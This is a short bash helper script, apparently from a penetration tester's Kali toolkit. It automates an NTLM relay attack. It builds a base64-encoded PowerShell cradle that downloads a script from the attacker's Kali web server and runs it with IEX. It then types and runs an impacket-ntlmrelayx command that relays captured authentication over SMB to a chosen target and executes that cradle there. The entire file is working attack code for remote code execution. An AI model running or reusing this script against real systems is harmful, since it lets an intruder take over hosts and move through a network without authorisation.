#!/bin/bash

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

# Change this: expects PS script in webroot at /b/run.txt
full_command="\$text = \"(New-Object System.Net.WebClient).DownloadString('http://${KALI_IP}/b/run.txt') | IEX\"; \$bytes = [System.Text.Encoding]::Unicode.GetBytes(\$text); \$EncodedText = [Convert]::ToBase64String(\$bytes); return \$EncodedText"

ret_val=$(pwsh -c $full_command)

target=$(zenity --entry --title="Relay target" --text="Target:")

com="impacket-ntlmrelayx --no-http-server -smb2support -t ${target} -c 'powershell -enc ${ret_val}'"

paste_command --delay 10 "${com}"
xdotool key Return
